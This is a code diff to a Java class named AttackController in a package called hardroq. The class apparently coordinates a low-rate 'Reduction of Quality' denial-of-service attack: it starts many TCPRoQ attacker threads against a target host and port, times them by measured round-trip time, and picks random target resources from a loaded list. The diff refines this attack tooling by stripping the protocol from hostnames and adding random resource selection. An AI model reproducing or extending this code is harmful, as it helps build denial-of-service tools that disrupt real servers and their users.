@@ -6,16 +6,15 @@ import hardroq.networking.TCPRoQ;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileInputStream;
-import java.io.FileNotFoundException;
-import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.URL;
 import java.net.URLConnection;
+import java.util.Random;
 
 public class AttackController {
 	//Singleton Crap
-	private static AttackController _instance = new AttackController();
+	private static final AttackController _instance = new AttackController();
 	private AttackController() {}
 	
 	//Statics
@@ -24,6 +23,7 @@ public class AttackController {
 	}
 
 	//Internals
+	private static final Random random = new Random();
 	private TCPRoQ[] attackers;
 	private String host;
 	private int port;
@@ -39,6 +39,10 @@ public class AttackController {
 	private String[] resources = new String[0];
 	
 	public void Attack() {
+	    //let's strip protocol off of the hostname
+	    if (host.contains("://"))
+	        host = host.substring(host.indexOf("://") + 3);
+	    
 		//First, let's start the RTT Pinger to initialize the attack vectors
 		attacking  = true;
 		startPinging();
@@ -53,7 +57,6 @@ public class AttackController {
 		startingRTT = RTT;	
 		
 		TCPRoQ.setRTT(RTT);
-		TCPRoQ.setResources(resources);
 		
 		attackers = new TCPRoQ[numThreads];
 		for (int i = numThreads; --i >= 0;) {
@@ -98,7 +101,7 @@ public class AttackController {
 		}
 	};
 	
-	public void LoadResourceList(File resources) {
+	public void LoadResourceList(final File resources) {
 		try {
 			parseResources(new FileInputStream(resources));
 		} catch (Exception e) {
@@ -106,7 +109,7 @@ public class AttackController {
 		}
 	}
 	
-	public void LoadResourceList(URL resources) {
+	public void LoadResourceList(final URL resources) {
 		try {
 			URLConnection c = resources.openConnection();
 			parseResources(c.getInputStream());
@@ -115,7 +118,7 @@ public class AttackController {
 		}
 	}
 	
-	private void parseResources(InputStream in) throws Exception {
+	private void parseResources(final InputStream in) throws Exception {
 		BufferedReader br = new BufferedReader(new InputStreamReader(in));
 		
 		String[] arr = new String[0];
@@ -193,4 +196,16 @@ public class AttackController {
 	public boolean isAttacking() {
 		return attacking;
 	}
+
+    public String getRandomResource() {
+        return resources[random.nextInt(resources.length)];
+    }
+
+    public String getHost() {
+        return host;
+    }
+    
+    public int getPort() {
+        return port;
+    }
 }
